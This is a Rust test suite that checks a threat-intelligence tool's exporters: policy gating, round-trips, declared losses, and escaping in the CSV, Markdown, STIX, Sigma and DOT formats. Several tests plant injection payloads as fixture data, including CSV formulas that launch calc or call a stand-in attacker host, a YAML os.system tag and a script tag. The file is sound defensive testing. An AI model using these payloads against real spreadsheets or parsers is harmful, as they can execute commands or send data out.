//! Every exporter, against one built pack and a real policy identity.
//!
//! One section per acceptance criterion of [#54](https://github.com/jusso-dev/Brolga/issues/54).
//!
//! The pack is built once by [`fixture`] and shared, so a test that passes for one format and fails
//! for another is comparing like with like — and so adding an exporter cannot quietly skip the
//! whole-registry checks, which iterate the registry rather than a list written here.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    clippy::indexing_slicing
)]

use std::collections::BTreeSet;

use brolga_config::policy::{Capability, PolicyIdentity};
use brolga_export::{
    Cleared, ExportError, Exporter, ExporterRegistry, Lossiness, Orientation, clear, csv, dot,
    json, markdown, misp, sarif, sigma, stix,
};
use brolga_model::pack::{
    Budget, BudgetReport, ClaimSummary, ContextPack, Contradiction, DetailLevel, EntitySummary,
    EvidenceRef, Exclusion, ExclusionReason, ExpansionHandle, Finding, Gap, PackGraph,
    PackMetadata, PackSubject, Pivot, PolicyContext, Recommendation, RelationshipSummary,
    SightingSummary,
};
use brolga_model::{Disposition, Marking, MarkingSet, ShortText, TlpLevel, UntrustedText};

fn short(value: &str) -> ShortText {
    ShortText::new(value).expect("a usable short text")
}

fn untrusted(value: &str) -> UntrustedText {
    UntrustedText::new(value).expect("a usable untrusted text")
}

fn evidence() -> Vec<EvidenceRef> {
    vec![EvidenceRef::new(
        "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
    )]
}

/// A pack with something in every collection.
///
/// Every field populated on purpose: an exporter that silently drops a section would pass a test
/// against an empty pack, and the sections most likely to be dropped are the ones a reader most needs
/// — gaps and exclusions.
fn fixture() -> ContextPack {
    let pack = ContextPack {
        schema_version: brolga_model::SchemaTag::new(),
        fingerprint: String::new(),
        subject: PackSubject {
            kind: short("domain_name"),
            value: short("bad.example.com"),
            observable_id: "observable:0000".to_owned(),
        },
        purpose: Some(short("incident_triage")),
        detail_level: DetailLevel::L2,
        disposition: Disposition::Malicious,
        graph: PackGraph {
            entities: vec![
                EntitySummary {
                    id: "entity:1".to_owned(),
                    kind: short("malware"),
                    name: untrusted("Examplebot"),
                    status: short("active"),
                },
                EntitySummary {
                    id: "entity:2".to_owned(),
                    kind: short("detection_rule"),
                    name: untrusted("A rule STIX has no type for"),
                    status: short("active"),
                },
            ],
            claims: vec![ClaimSummary {
                predicate: short("misp.to_ids"),
                object: untrusted("true"),
                status: short("active"),
                confidence: Some(90),
                evidence: evidence(),
            }],
            relationships: vec![RelationshipSummary {
                kind: short("communicates_with"),
                source: "entity:1".to_owned(),
                target: "entity:2".to_owned(),
                status: short("active"),
            }],
            sightings: vec![SightingSummary {
                count: 3,
                first_seen: "2026-04-01T00:00:00Z".to_owned(),
                last_seen: "2026-04-10T00:00:00Z".to_owned(),
                observer: Some("entity:3".to_owned()),
            }],
            techniques: vec![short("T1059.001")],
            clusters: Vec::new(),
            contradictions: vec![Contradiction {
                subject: short("disposition"),
                left: untrusted("malicious"),
                right: untrusted("benign"),
                evidence: evidence(),
            }],
            pivots: vec![Pivot {
                target: short("203.0.113.42"),
                reason: untrusted("resolved from this domain last week"),
            }],
        },
        handles: vec![ExpansionHandle::new(
            "observable:0000",
            short("observable"),
            DetailLevel::L4,
            7,
            "2026-05-01T00:00:00Z",
        )],
        findings: vec![Finding {
            kind: short("feed_disposition"),
            statement: untrusted("Two feeds flag this domain as a phishing host."),
            evidence: evidence(),
        }],
        recommendations: vec![Recommendation {
            action: short("block"),
            rationale: untrusted("Both feeds set to_ids."),
            evidence: evidence(),
        }],
        gaps: vec![Gap {
            subject: short("passive_dns"),
            detail: untrusted("No resolution history is held for this domain."),
        }],
        exclusions: vec![
            Exclusion {
                category: short("sightings"),
                reason: ExclusionReason::BudgetExhausted,
                dropped: Some(12),
            },
            // The model requires a restricted pack to say what policy withheld, and the fixture is
            // restricted on purpose — every exporter must be exercised against a pack that carries a
            // restriction, because that is the state a consumer most needs told about.
            Exclusion {
                category: short("claims"),
                reason: ExclusionReason::PolicyRestricted,
                dropped: Some(3),
            },
        ],
        budget: BudgetReport {
            requested: Budget {
                tokens: Some(4_000),
                bytes: None,
                objects: Some(100),
                relationships: Some(50),
                depth: Some(2),
                time_ms: Some(500),
            },
            consumed: Budget {
                tokens: Some(1_200),
                bytes: None,
                objects: Some(11),
                relationships: Some(1),
                depth: Some(1),
                time_ms: Some(12),
            },
            exhausted: false,
        },
        policy: PolicyContext {
            recipient: None,
            markings: MarkingSet::from_iter_of([Marking::Tlp(TlpLevel::Amber)]),
            restricted: true,
        },
        metadata: PackMetadata {
            generated_at: "2026-05-01T10:00:00Z".to_owned(),
            request_id: Some("req-1".to_owned()),
            build_duration_ms: Some(12),
            brolga_version: env!("CARGO_PKG_VERSION").to_owned(),
            graph_version: 7,
        },
    };
    pack.validated().expect("the fixture must be a valid pack")
}

/// An identity cleared for everything, so a test about formats is not really a test about policy.
fn operator() -> PolicyIdentity {
    PolicyIdentity::local_operator()
}

/// An identity cleared to read but not to redistribute.
fn reader() -> PolicyIdentity {
    let mut identity = PolicyIdentity::local_operator();
    identity.capabilities = BTreeSet::from([Capability::Read, Capability::ExpandCanonical]);
    identity.name = "reader".to_owned();
    identity
}

// ---------------------------------------------------------------------------
// Criterion: every exporter declares version, orientation, and lossiness.
// ---------------------------------------------------------------------------

/// **The criterion.** Every shipped exporter declares all three, and none is defaulted by omission.
///
/// Iterates the registry rather than a list written here, so a new exporter is covered the moment it
/// is registered.
#[test]
fn every_exporter_declares_version_orientation_and_lossiness() {
    let registry = ExporterRegistry::shipped();
    assert!(
        registry.names().len() >= 13,
        "#54 names thirteen formats: {:?}",
        registry.names()
    );

    for metadata in registry.metadata() {
        assert!(
            metadata.version > 0,
            "`{}` declares version {}",
            metadata.id,
            metadata.version
        );
        assert!(
            !metadata.media_type.is_empty(),
            "`{}` declares no media type",
            metadata.id
        );
        assert!(
            !metadata.extension.is_empty(),
            "`{}` declares no extension",
            metadata.id
        );
        assert!(
            !metadata.summary.is_empty(),
            "`{}` declares no summary",
            metadata.id
        );
        // Orientation and lossiness are enums, so their presence is a type-level fact — what a test
        // can check is that the *label* is a real one, which catches a stringly-typed regression.
        assert!(!metadata.orientation.as_str().is_empty());
        assert!(!metadata.lossiness.as_str().is_empty());
    }
}

/// Names are distinct and stable. A second exporter registered under one name would silently replace
/// the first, and a caller asking for `stix` would get whichever was registered last.
#[test]
fn every_exporter_has_a_distinct_short_name_and_identifier() {
    let registry = ExporterRegistry::shipped();
    let names = registry.names();
    let mut sorted = names.clone();
    sorted.sort_unstable();
    sorted.dedup();
    assert_eq!(
        sorted.len(),
        names.len(),
        "a short name collides: {names:?}"
    );

    let mut ids: Vec<&str> = registry
        .metadata()
        .iter()
        .map(|metadata| metadata.id.as_str())
        .collect();
    ids.sort_unstable();
    let before = ids.len();
    ids.dedup();
    assert_eq!(before, ids.len(), "an identifier collides: {ids:?}");
}

/// Every exporter produces something for a fully-populated pack. An exporter that errors on a valid
/// pack is not an exporter.
#[test]
fn every_exporter_emits_utf8_bytes_for_a_valid_pack() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    for name in registry.names() {
        let exported = registry
            .export(name, &pack, &identity)
            .unwrap_or_else(|error| panic!("`{name}` failed: {error}"));
        assert!(!exported.bytes.is_empty(), "`{name}` produced no bytes");
        assert!(
            exported.as_str().is_some(),
            "`{name}` produced bytes that are not UTF-8"
        );
    }
}

// ---------------------------------------------------------------------------
// Criterion: policy runs after format selection and before bytes emit.
// ---------------------------------------------------------------------------

/// **The criterion, as a structural property.** An exporter cannot be reached without a decision,
/// because it takes a [`Cleared`] and only [`clear`] builds one.
///
/// This test documents the property; the compiler enforces it. There is no `emit(&ContextPack)` to
/// call, so there is no path a future change could take that skips the gate without also changing the
/// trait signature — which a reviewer would see.
#[test]
fn an_exporter_cannot_be_called_without_a_policy_decision() {
    let pack = fixture();
    let identity = operator();
    let exporter = json::PackJsonExporter::new();

    let cleared: Cleared<'_> = clear(&pack, &identity, &exporter).expect("the operator may read");
    assert_eq!(cleared.identity_name(), identity.name);
    assert_eq!(cleared.capability(), Capability::Read);
    assert!(exporter.emit(&cleared).is_ok());
}

/// **The criterion's whole point.** The capability required depends on the format, so the decision
/// cannot be made before the format is known.
#[test]
fn the_required_capability_depends_on_the_format_chosen() {
    let pack = fixture();
    let reader = reader();

    // A human-oriented export is a read, and the reader may have it.
    let markdown = markdown::MarkdownExporter::new();
    assert_eq!(markdown.capability(), Capability::Read);
    assert!(clear(&pack, &reader, &markdown).is_ok());

    // An interchange export is redistribution, and the same identity may not.
    let stix = stix::StixExporter::new();
    assert_eq!(stix.capability(), Capability::Redistribute);
    let error = clear(&pack, &reader, &stix).expect_err("redistribution must be refused");
    match error {
        ExportError::Denied { denials } => {
            assert!(
                denials.iter().any(|denial| denial.contains("redistribute")),
                "the denial must name the missing capability: {denials:?}"
            );
        }
        other => panic!("{other:?}"),
    }

    // And the refusal is not a formatting failure: the operator, who may redistribute, gets bytes.
    assert!(clear(&pack, &operator(), &stix).is_ok());
}

/// A refused export produces no bytes at all, not truncated ones.
#[test]
fn a_refused_export_produces_no_bytes() {
    let pack = fixture();
    let registry = ExporterRegistry::shipped();
    let reader = reader();

    let error = registry
        .export("stix", &pack, &reader)
        .expect_err("must be refused");
    assert!(matches!(error, ExportError::Denied { .. }), "{error:?}");
    // `export` returns `Result<Exported, _>`, so there is no partial value to leak — asserted by the
    // type, stated here so the property is visible in the test list.
}

/// Every denial is reported, not the first. An operator widening an authorisation needs the list.
#[test]
fn every_denial_is_reported() {
    let pack = fixture();
    let mut identity = PolicyIdentity::anonymous();
    identity.name = "restricted".to_owned();
    // Anonymous is cleared to TLP:CLEAR and holds only `Read`; the pack is TLP:AMBER and STIX needs
    // redistribution. Two independent reasons.
    let error =
        clear(&pack, &identity, &stix::StixExporter::new()).expect_err("two rules must refuse");
    match error {
        ExportError::Denied { denials } => assert!(
            denials.len() >= 2,
            "both the marking and the capability must be reported: {denials:?}"
        ),
        other => panic!("{other:?}"),
    }
}

/// An unknown format is a distinct error from a refusal, and it lists what exists.
#[test]
fn an_unknown_format_names_the_ones_that_exist() {
    let pack = fixture();
    let error = ExporterRegistry::shipped()
        .export("parquet", &pack, &operator())
        .expect_err("no such exporter");
    match error {
        ExportError::UnknownFormat {
            requested,
            available,
        } => {
            assert_eq!(requested, "parquet");
            assert!(available.contains(&"stix".to_owned()), "{available:?}");
        }
        other => panic!("{other:?}"),
    }
}

// ---------------------------------------------------------------------------
// Criterion: lossless exporters round-trip; lossy ones declare what they dropped.
// ---------------------------------------------------------------------------

/// **The criterion.** An exporter claiming [`Lossiness::Lossless`] round-trips to an equal pack.
///
/// The only lossiness claim a test can falsify, which is why it is worth making.
#[test]
fn every_lossless_exporter_round_trips() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    let mut checked = 0usize;
    for name in registry.names() {
        let exported = registry.export(name, &pack, &identity).unwrap();
        if exported.metadata.lossiness != Lossiness::Lossless {
            continue;
        }
        checked = checked.saturating_add(1);

        let text = exported.as_str().unwrap();
        let back: ContextPack = if exported.metadata.media_type.contains("yaml") {
            serde_norway::from_str(text).unwrap_or_else(|error| {
                panic!("`{name}` claims lossless but does not parse back: {error}")
            })
        } else {
            json::parse_pack(&exported.bytes).unwrap_or_else(|error| {
                panic!("`{name}` claims lossless but does not parse back: {error}")
            })
        };
        assert_eq!(back, pack, "`{name}` claims lossless but changed the pack");
    }
    assert!(checked >= 3, "the lossless claim must be exercised");
}

/// **The criterion.** An exporter that drops or invents anything says what.
#[test]
fn every_lossy_exporter_names_what_it_dropped() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    for name in registry.names() {
        let exported = registry.export(name, &pack, &identity).unwrap();
        if exported.metadata.lossiness.must_declare_losses() {
            assert!(
                !exported.declared_losses.is_empty(),
                "`{name}` is {} and declares no losses",
                exported.metadata.lossiness.as_str()
            );
            for loss in &exported.declared_losses {
                assert!(loss.len() > 10, "`{name}` declares an empty loss: {loss}");
            }
        } else if exported.metadata.lossiness == Lossiness::Lossless {
            assert!(
                exported.declared_losses.is_empty(),
                "`{name}` claims lossless and declares losses: {:?}",
                exported.declared_losses
            );
        }
    }
}

/// **The criterion.** STIX and MISP document their unmappable fields specifically.
#[test]
fn the_interchange_exporters_document_their_unmappable_fields() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    let stix = registry.export("stix", &pack, &identity).unwrap();
    let losses = stix.declared_losses.join(" ");
    assert!(losses.contains("budget"), "{losses}");
    assert!(losses.contains("gaps"), "{losses}");
    // The fixture holds a `detection_rule` entity, which STIX has no SDO for. The bundle must say so.
    let bundle: serde_json::Value = serde_json::from_slice(&stix.bytes).unwrap();
    let rendered = bundle.to_string();
    assert!(
        rendered.contains("no STIX equivalent"),
        "the unmapped entity kind must be named in the bundle: {rendered}"
    );

    let misp = registry.export("misp", &pack, &identity).unwrap();
    let losses = misp.declared_losses.join(" ");
    assert!(losses.contains("Orgc"), "{losses}");
    assert!(losses.contains("template"), "{losses}");
}

// ---------------------------------------------------------------------------
// Criterion: CSV protects spreadsheet consumers from formula execution.
// ---------------------------------------------------------------------------

/// **The criterion.** A feed-supplied value that a spreadsheet would execute is neutralised in the
/// bytes the exporter actually emits.
///
/// Asserted end to end rather than on the escaping helper alone: a correct helper that one call site
/// forgets to use is the failure this catches.
#[test]
fn the_csv_export_neutralises_every_formula_in_its_output() {
    let mut pack = fixture();
    // A hostile value in each of the places feed text reaches a cell.
    pack.findings[0].statement = untrusted("=cmd|'/c calc'!A0");
    pack.graph.claims[0].object = untrusted("+1+1");
    pack.graph.entities[0].name = untrusted("@SUM(A1)");
    pack.gaps[0].detail = untrusted("-1+cmd|'/c calc'!A0");
    pack.recommendations[0].rationale = untrusted("=WEBSERVICE(\"http://attacker.invalid\")");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("csv", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();

    // No cell may begin with a formula character. Every field is either bare or quoted, so a formula
    // would appear as `,=` or `,"=` — both of which are checked.
    for (number, line) in text.lines().enumerate() {
        for field in line.split(',') {
            let trimmed = field.trim_start_matches('"');
            assert!(
                !trimmed.starts_with(['=', '+', '@']),
                "line {number} has an executable cell: {line}"
            );
        }
    }
    // And the values are still there, prefixed rather than deleted — a silently dropped finding would
    // be worse than an escaped one.
    assert!(text.contains("'=cmd"), "{text}");
    assert!(text.contains("'+1+1"), "{text}");
    assert!(text.contains("'@SUM"), "{text}");
    assert!(text.contains("'-1+cmd"), "{text}");
}

/// A quoted field containing a comma does not shift the columns, so a consumer parsing by position
/// reads the right values.
#[test]
fn the_csv_export_quotes_values_containing_the_delimiter() {
    let mut pack = fixture();
    pack.findings[0].statement = untrusted("two feeds, both of them, flagged it");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("csv", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();
    assert!(
        text.contains("\"two feeds, both of them, flagged it\""),
        "{text}"
    );
    // Header column count is the contract; the finding row must have the same number of fields.
    let header = text.lines().next().unwrap();
    assert_eq!(header.split(',').count(), csv::COLUMNS.len());
}

// ---------------------------------------------------------------------------
// Criterion: human narratives retain evidence references.
// ---------------------------------------------------------------------------

/// **The criterion.** Every human-oriented export cites the evidence behind each assertion, in the
/// output itself rather than in an appendix.
#[test]
fn every_human_export_cites_its_evidence() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    let source = &pack.findings[0].evidence[0].source_object_id;
    let mut checked = 0usize;

    for name in registry.names() {
        let exported = registry.export(name, &pack, &identity).unwrap();
        if !matches!(
            exported.metadata.orientation,
            Orientation::Human | Orientation::Agent
        ) {
            continue;
        }
        let text = exported.as_str().unwrap();
        // DOT is human-oriented and has nowhere to cite; it declares that loss instead.
        if exported.metadata.id == dot::DOT_ID {
            assert!(
                exported.declared_losses.join(" ").contains("evidence"),
                "`{name}` cannot cite and must declare it"
            );
            continue;
        }
        checked = checked.saturating_add(1);
        // Abbreviated or full, the address must be findable from the text.
        let prefix: String = source.chars().take(20).collect();
        assert!(
            text.contains(&prefix),
            "`{name}` does not cite its evidence: {text}"
        );
    }
    assert!(checked >= 3, "the human exports must be exercised");
}

/// The narrative exports state what is *not* known, so a reader cannot mistake the report for
/// complete.
#[test]
fn every_narrative_export_states_the_gaps_and_the_restriction() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    for name in ["markdown", "text", "brief", "hunt"] {
        let exported = registry.export(name, &pack, &identity).unwrap();
        let text = exported.as_str().unwrap();
        assert!(
            text.contains("passive_dns") || text.contains("passive\\_dns"),
            "`{name}` omits the gap: {text}"
        );
        assert!(
            text.to_lowercase().contains("withheld")
                || text.to_lowercase().contains("restricted")
                || text.to_lowercase().contains("left out"),
            "`{name}` does not say material was withheld: {text}"
        );
    }
}

/// A feed cannot inject Markdown structure into a report an analyst pastes into a ticket.
#[test]
fn markdown_escapes_feed_supplied_text_in_its_output() {
    let mut pack = fixture();
    pack.findings[0].statement =
        untrusted("# Injected heading\n[click](http://attacker.invalid)\n<script>x</script>");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("markdown", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();

    assert!(
        !text.contains("\n# Injected"),
        "a feed injected a heading: {text}"
    );
    // A link needs an unescaped `[` … `]`. The brackets are escaped, so the pair cannot form —
    // asserted on the escaping rather than on the substring, because `\](http://…)` legitimately
    // contains `](http://…)` and is inert.
    assert!(!text.contains("[click]"), "a feed injected a link: {text}");
    assert!(
        text.contains("\\[click\\]"),
        "the brackets must be escaped: {text}"
    );
    assert!(!text.contains("<script>"), "{text}");
}

// ---------------------------------------------------------------------------
// The interchange formats, in detail.
// ---------------------------------------------------------------------------

/// A STIX export is deterministic: the same pack exports to identical bytes.
///
/// The property that stops a consumer re-ingesting an unchanged pack from duplicating everything.
#[test]
fn a_stix_export_is_byte_identical_for_the_same_pack() {
    let pack = fixture();
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    let first = registry.export("stix", &pack, &identity).unwrap();
    let second = registry.export("stix", &pack, &identity).unwrap();
    assert_eq!(first.bytes, second.bytes);

    // And a different pack exports differently, so determinism is not constancy.
    let mut other = fixture();
    other.subject.value = short("worse.example.net");
    let other = other.validated().unwrap();
    let third = registry.export("stix", &other, &identity).unwrap();
    assert_ne!(first.bytes, third.bytes);
}

/// The bundle is well-formed STIX: a typed bundle, every object with a `type` and an `id` in the
/// `<type>--<uuid>` form the specification requires.
#[test]
fn the_stix_bundle_is_well_formed() {
    let pack = fixture();
    let exported = ExporterRegistry::shipped()
        .export("stix", &pack, &operator())
        .unwrap();
    let bundle: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();

    assert_eq!(bundle["type"], "bundle");
    assert!(
        bundle["id"].as_str().unwrap().starts_with("bundle--"),
        "{bundle}"
    );
    let objects = bundle["objects"].as_array().unwrap();
    assert!(!objects.is_empty());
    for object in objects {
        let kind = object["type"].as_str().expect("every object has a type");
        let id = object["id"].as_str().expect("every object has an id");
        assert!(
            id.starts_with(&format!("{kind}--")),
            "`{id}` is not `{kind}--<uuid>`"
        );
    }
    // The subject is a domain, so a `domain-name` SCO must be present.
    assert!(
        objects
            .iter()
            .any(|object| object["type"] == "domain-name" && object["value"] == "bad.example.com"),
        "{bundle}"
    );
}

/// A feed cannot escape a STIX pattern literal.
#[test]
fn a_hostile_subject_value_cannot_escape_a_stix_pattern() {
    let mut pack = fixture();
    pack.subject.value = short("a' OR domain-name:value = 'b");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("stix", &pack, &operator())
        .unwrap();
    let bundle: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();
    let patterns: Vec<&str> = bundle["objects"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|object| object["pattern"].as_str())
        .collect();
    assert!(!patterns.is_empty(), "{bundle}");
    for pattern in patterns {
        // Exactly one closing quote-bracket: the literal was not closed early.
        assert_eq!(
            pattern.matches("']").count(),
            1,
            "the pattern literal was escaped: {pattern}"
        );
        assert!(pattern.contains("\\'"), "{pattern}");
    }
}

/// MISP's `to_ids` is set only for a malicious disposition — the flag that decides whether an
/// indicator reaches somebody's blocklist.
#[test]
fn misp_sets_to_ids_only_for_a_malicious_disposition() {
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    for (disposition, expected) in [
        (Disposition::Malicious, true),
        (Disposition::Suspicious, false),
        (Disposition::Benign, false),
        (Disposition::Unknown, false),
    ] {
        let mut pack = fixture();
        pack.disposition = disposition;
        let pack = pack.validated().unwrap();

        let exported = registry.export("misp", &pack, &identity).unwrap();
        let event: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();
        let subject = &event["Event"]["Attribute"][0];
        assert_eq!(
            subject["to_ids"], expected,
            "{disposition:?} produced to_ids {}",
            subject["to_ids"]
        );
    }
}

/// A MISP event is never distributed onward by default, and never published. An export that widened
/// either would widen a policy decision the operator never made.
#[test]
fn a_misp_event_is_neither_published_nor_distributed_by_default() {
    let pack = fixture();
    let exported = ExporterRegistry::shipped()
        .export("misp", &pack, &operator())
        .unwrap();
    let event: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();

    assert_eq!(event["Event"]["published"], false);
    assert_eq!(
        event["Event"]["distribution"], "0",
        "`0` is MISP's own `your organisation only`"
    );
    // The pack's TLP marking travels as a tag, so a receiving instance can enforce it.
    let tags = event["Event"]["Tag"].as_array().unwrap();
    assert!(
        tags.iter().any(|tag| tag["name"] == "tlp:amber"),
        "{tags:?}"
    );
}

// ---------------------------------------------------------------------------
// The rest, in detail.
// ---------------------------------------------------------------------------

/// The Sigma export is not runnable, and says so in a field a tool reads as well as in a comment a
/// person reads.
#[test]
fn the_sigma_export_is_not_runnable_and_says_so_twice() {
    let pack = fixture();
    let exported = ExporterRegistry::shipped()
        .export("sigma", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();

    assert!(
        !text.contains("\nlogsource:"),
        "a log source would make this deployable without review: {text}"
    );
    assert!(text.contains("NOT RUNNABLE"), "{text}");
    assert!(
        text.contains("status: experimental"),
        "a rule-management tool reads `status`: {text}"
    );
    // It is still valid YAML, so a detection engineer can open it in their tooling.
    let parsed: serde_norway::Value = serde_norway::from_str(text).expect("valid YAML");
    assert!(parsed.get("detection").is_some(), "{text}");
    assert!(parsed.get("logsource").is_none(), "{text}");
}

/// A feed cannot inject YAML keys into a Sigma document.
#[test]
fn a_feed_cannot_inject_yaml_into_the_sigma_export() {
    let mut pack = fixture();
    // A newline cannot reach a subject value at all — `ShortText` refuses control characters, so the
    // model closes that route before an exporter sees it. The route that *is* open is feed prose,
    // which is `UntrustedText` and may contain anything.
    assert!(
        ShortText::new("x\nlogsource:\n  product: windows").is_err(),
        "the model must refuse a control character in a short text"
    );
    pack.subject.value = short("*alias");
    pack.findings[0].statement =
        untrusted("x\nlogsource:\n  product: windows\n&anchor !!python/object/apply:os.system");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("sigma", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();
    let parsed: serde_norway::Value = serde_norway::from_str(text).expect("still valid YAML");
    assert!(
        parsed.get("logsource").is_none(),
        "a feed added a log source: {text}"
    );
}

/// A feed cannot inject DOT syntax.
#[test]
fn a_feed_cannot_inject_dot_syntax_into_the_graph_export() {
    let mut pack = fixture();
    pack.graph.entities[0].name = untrusted("x\", shape=none]; evil [label=\"pwned\"");
    let pack = pack.validated().unwrap();

    let exported = ExporterRegistry::shipped()
        .export("dot", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();

    // The invariant is that a feed cannot introduce a *statement*. In this writer every statement
    // begins a line, so the check is that no line begins with something the feed supplied — not that
    // the bytes `evil [` are absent, which they are not and harmlessly so: they sit inside a quoted,
    // quote-escaped label.
    for line in text.lines() {
        let trimmed = line.trim_start();
        assert!(
            !trimmed.starts_with("evil"),
            "a feed introduced a statement: {line}"
        );
    }
    // And every node declared is one this writer named.
    let declared = text
        .lines()
        .filter(|line| line.trim_start().starts_with('n') && line.contains("[label="))
        .count();
    assert!(declared >= 1, "{text}");
    assert!(text.contains("digraph brolga"), "{text}");
    // The legend says the colours are a rendering choice, not intelligence.
    assert!(text.contains("not intelligence"), "{text}");
}

/// SARIF reports its applicability rather than fabricating results for a pack it does not describe.
#[test]
fn sarif_reports_applicability_rather_than_inventing_results() {
    let identity = operator();
    let registry = ExporterRegistry::shipped();

    // The fixture is about a domain, which SARIF does not describe.
    let pack = fixture();
    let exported = registry.export("sarif", &pack, &identity).unwrap();
    let log: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();
    assert_eq!(log["runs"][0]["properties"]["brolgaApplicable"], false);
    assert!(
        log["runs"][0]["results"].as_array().unwrap().is_empty(),
        "a pack SARIF does not describe must produce no results: {log}"
    );
    assert!(
        exported
            .declared_losses
            .join(" ")
            .contains("not about a vulnerability"),
        "{:?}",
        exported.declared_losses
    );

    // A pack about a vulnerability does produce results.
    let mut vulnerability = fixture();
    vulnerability.subject.kind = short("vulnerability");
    vulnerability.subject.value = short("CVE-2021-44228");
    let vulnerability = vulnerability.validated().unwrap();

    let exported = registry.export("sarif", &vulnerability, &identity).unwrap();
    let log: serde_json::Value = serde_json::from_slice(&exported.bytes).unwrap();
    assert_eq!(log["runs"][0]["properties"]["brolgaApplicable"], true);
    let results = log["runs"][0]["results"].as_array().unwrap();
    assert_eq!(results.len(), 1, "{log}");
    // No fabricated location.
    assert!(
        results[0].get("locations").is_none(),
        "a location was invented: {log}"
    );
    // Evidence survives.
    assert!(
        !results[0]["properties"]["brolgaEvidence"]
            .as_array()
            .unwrap()
            .is_empty(),
        "{log}"
    );
}

/// JSONL is one object per line, in the documented order, and every line is a complete JSON document.
#[test]
fn jsonl_is_one_complete_object_per_line_in_the_documented_order() {
    let pack = fixture();
    let exported = ExporterRegistry::shipped()
        .export("jsonl", &pack, &operator())
        .unwrap();
    let text = exported.as_str().unwrap();

    let mut kinds: Vec<String> = Vec::new();
    for line in text.lines() {
        let value: serde_json::Value =
            serde_json::from_str(line).unwrap_or_else(|error| panic!("`{line}`: {error}"));
        kinds.push(value["line"].as_str().unwrap().to_owned());
    }

    assert_eq!(kinds.first().map(String::as_str), Some("header"));
    assert_eq!(kinds.last().map(String::as_str), Some("policy"));
    // The order the constant documents, restricted to the kinds this pack actually produced.
    let expected: Vec<&str> = json::JSONL_LINE_ORDER
        .iter()
        .copied()
        .filter(|kind| kinds.iter().any(|seen| seen == kind))
        .collect();
    let mut seen_order: Vec<&str> = Vec::new();
    for kind in &kinds {
        if !seen_order.contains(&kind.as_str()) {
            seen_order.push(kind.as_str());
        }
    }
    assert_eq!(
        seen_order, expected,
        "the line order is not the documented one"
    );
}

/// An empty pack exports in every format. A pack with nothing in it is a real answer — "nothing is
/// known about this" — and an exporter that panicked or produced nothing for one would be unusable in
/// exactly the case an operator most needs a legible answer.
#[test]
fn every_exporter_handles_a_pack_with_nothing_in_it() {
    let mut pack = fixture();
    pack.findings.clear();
    pack.recommendations.clear();
    pack.graph = PackGraph::default();
    pack.handles.clear();
    pack.gaps.clear();
    pack.exclusions.clear();
    pack.disposition = Disposition::Unknown;
    // Cleared alongside the exclusions: the model refuses a restricted pack that does not say what
    // was withheld, and this test is about an empty pack rather than a restricted one.
    pack.policy.restricted = false;
    let pack = pack.validated().unwrap();

    let identity = operator();
    let registry = ExporterRegistry::shipped();
    for name in registry.names() {
        let exported = registry
            .export(name, &pack, &identity)
            .unwrap_or_else(|error| panic!("`{name}` failed on an empty pack: {error}"));
        assert!(
            !exported.bytes.is_empty(),
            "`{name}` produced nothing for an empty pack"
        );
    }
}

/// The metadata's declared extension and media type agree with each other, so a caller naming a file
/// from one and a `Content-Type` from the other cannot disagree.
#[test]
fn the_declared_extension_and_media_type_agree() {
    for metadata in ExporterRegistry::shipped().metadata() {
        let expected = match metadata.extension {
            "json" | "sarif" => "json",
            "yaml" => "yaml",
            "jsonl" => "ndjson",
            "md" => "markdown",
            "txt" => "plain",
            "csv" => "csv",
            "dot" => "graphviz",
            "yml" => "yaml",
            other => panic!("`{}` declares extension `{other}`", metadata.id),
        };
        assert!(
            metadata.media_type.contains(expected),
            "`{}` declares `{}` and `.{}`",
            metadata.id,
            metadata.media_type,
            metadata.extension
        );
    }
}

/// The module-level constants are reachable and non-empty, so a caller can read the losses before
/// choosing a format rather than after diffing one.
#[test]
fn the_documented_loss_lists_are_public_and_populated() {
    for (name, losses) in [
        ("stix", stix::LOSSES),
        ("misp", misp::LOSSES),
        ("csv", csv::LOSSES),
        ("dot", dot::LOSSES),
        ("sarif", sarif::LOSSES),
        ("sigma", sigma::SIGMA_LOSSES),
        ("hunt", sigma::HUNT_LOSSES),
        ("narrative", markdown::NARRATIVE_LOSSES),
    ] {
        assert!(!losses.is_empty(), "`{name}` declares no losses");
    }
}
